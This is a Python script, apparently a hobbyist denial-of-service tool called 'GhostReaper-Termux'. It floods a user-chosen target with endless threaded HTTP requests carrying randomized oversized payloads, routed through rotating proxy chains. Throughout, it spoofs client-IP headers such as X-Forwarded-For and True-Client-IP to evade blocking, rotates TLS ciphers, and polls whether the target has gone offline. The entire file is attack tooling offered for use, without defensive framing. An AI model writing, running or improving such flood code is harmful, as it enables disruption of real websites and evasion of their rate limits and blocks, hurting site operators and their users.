import http.client
import ssl
import json
import random
import threading
import time
from urllib.parse import urlparse
import socket
import sys
import traceback

# ANSI color codes
ANSI_RED = "\033[91m"
ANSI_GREEN = "\033[92m"
ANSI_YELLOW = "\033[93m"
ANSI_CYAN = "\033[96m"
ANSI_RESET = "\033[0m"

# Global
target = ""
threads = 0
proxy_file = ""
hop_count = 0
payload_type = ""
ua_file = ""
bypass_header = False
tls_spoofing = False
session_cycle = False
exploit_chain = False
delay = 0
flood_method = ""
failover_monitoring = False
proxies = []
user_agents = []
headers = {}
tls_context = ssl.create_default_context()
status_counter = {"200": 0, "403": 0, "503": 0, "other": 0}
parsed_url = urlparse(target)
semaphore = threading.Semaphore(100)

def load_proxies(file):
    global proxies
    with open(file, 'r') as f:
        proxies = [line.strip() for line in f]

def load_user_agents(file):
    global user_agents
    with open(file, 'r') as f:
        user_agents = [line.strip() for line in f]

def inject_headers():
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Connection": "keep-alive",
    }
    if bypass_header:
        headers["X-Originating-IP"] = random.choice(proxies)
        headers["X-Forwarded-Host"] = target
        headers["X-Request-ID"] = str(random.randint(100000, 999999))
        headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
        headers["User-Agent"] = random.choice(user_agents)
        headers["X-Forwarded-For"] = random.choice(proxies)
        headers["X-Real-IP"] = random.choice(proxies)
        headers["Via"] = random.choice(proxies)
        headers["Forwarded"] = f"for={random.choice(proxies)};host={target}"
        headers["True-Client-IP"] = random.choice(proxies)
        headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
        headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
    return headers

def mutate_payload(ptype):
    if ptype == "ghost-mutation":
        return json.dumps({
            "action": "ghost",
            "random": random.randint(1, 9999),
            "chain": ["A"*random.randint(100, 500) for _ in range(10)],
            "overflow": "X" * random.randint(10000, 30000)
        })
    elif ptype == "form":
        return "key=value&random=" + str(random.randint(1, 9999))
    elif ptype == "multipart":
        boundary = "----WebKitFormBoundary" + str(random.randint(1000, 9999))
        return (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="key"\r\n\r\n'
            f"value\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="random"\r\n\r\n'
            f"{random.randint(1, 9999)}\r\n"
            f"--{boundary}--\r\n"
        )
    return json.dumps({"error": "unknown payload type"})

def rotate_proxy_chain():
    if proxies:
        return random.sample(proxies, k=random.randint(1, hop_count))
    return []

def rotate_tls_context():
    ctx = ssl.create_default_context()
    ctx.set_ciphers(random.choice([
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "TLS_AES_256_GCM_SHA384"
    ]))
    return ctx

def handle_response(response, target, proxy_hop, rtt):
    status_code = response.status
    body = response.read().decode('utf-8', errors='ignore')
    if 200 <= status_code < 300:
        print(f"{ANSI_GREEN}[200] OK - {rtt*1000:.2f}ms - UA: {headers['User-Agent']} - Payload: {payload_type}{ANSI_RESET}")
        status_counter["200"] += 1
    elif status_code == 403:
        print(f"{ANSI_RED}[403] Blocked - Rotate Headers{ANSI_RESET}")
        status_counter["403"] += 1
    elif status_code == 429:
        print(f"{ANSI_YELLOW}[429] Rate Limit{ANSI_RESET}")
        status_counter["other"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    elif status_code == 503:
        print(f"{ANSI_YELLOW}[503] Overload{ANSI_RESET}")
        status_counter["503"] += 1
        time.sleep(delay + random.uniform(0.2, 1.0))
    else:
        print(f"{ANSI_RED}[{status_code}] Unexpected{ANSI_RESET}")
        status_counter["other"] += 1

def monitor_target():
    while True:
        try:
            conn = http.client.HTTPSConnection(parsed_url.netloc, timeout=5)
            conn.request("GET", "/")
            resp = conn.getresponse()
            print(f"[MONITOR] {resp.status}")
        except:
            print("[MONITOR] Offline")
        time.sleep(5)

def launch():
    global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring

    print("\n[1] Launch GhostReaper-Termux\n[2] Exit")
    choice = input("> ").strip()

    if choice != '1': return

    target = input("[Target] ")
    threads = int(input("[Threads] "))
    proxy_file = input("[Proxy-List] ")
    hop_count = int(input("[Proxy-Hop] "))
    payload_type = input("[Payload-Type] ")
    ua_file = input("[User-Agent-List] ")
    bypass_header = input("[Bypass-Header] ").lower() == 'yes'
    tls_spoofing = input("[TLS-Spoofing] ").lower() == 'yes'
    session_cycle = False
    exploit_chain = False
    delay = float(input("[Delay] "))
    flood_method = input("[Flood-Method] ")
    failover_monitoring = input("[Failover-Monitoring] ").lower() == 'yes'

    load_proxies(proxy_file)
    load_user_agents(ua_file)
    parsed = urlparse(target)

    def worker():
        global headers, tls_context
        tls_context = rotate_tls_context()
        while True:
            try:
                semaphore.acquire()
                proxy_chain = rotate_proxy_chain()
                for proxy in proxy_chain:
                    parsed_url = urlparse(target)
                    conn = http.client.HTTPSConnection(proxy, context=tls_context)
                    headers = inject_headers()
                    headers['User-Agent'] = random.choice(user_agents)
                    target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
                    payload_data = mutate_payload(payload_type)
                    conn.request(flood_method.upper(), target_path, payload_data, headers)
                    start = time.time()
                    resp = conn.getresponse()
                    rtt = time.time() - start
                    handle_response(resp, target, proxy_chain.index(proxy) + 1, rtt)
                    if failover_monitoring and resp.status in [403, 429, 503]:
                        time.sleep(delay + random.uniform(0.2, 1.0))
            except Exception as e:
                print(f"{ANSI_RED}[ERROR] {traceback.format_exc()}{ANSI_RESET}")
            finally:
                semaphore.release()

    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()

    if failover_monitoring:
        threading.Thread(target=monitor_target).start()

def print_status():
    while True:
        print(f"✅ 200: {status_counter['200']} | 🔒 403: {status_counter['403']} | ⚠️ 503: {status_counter['503']}")
        time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=print_status).start()
    launch()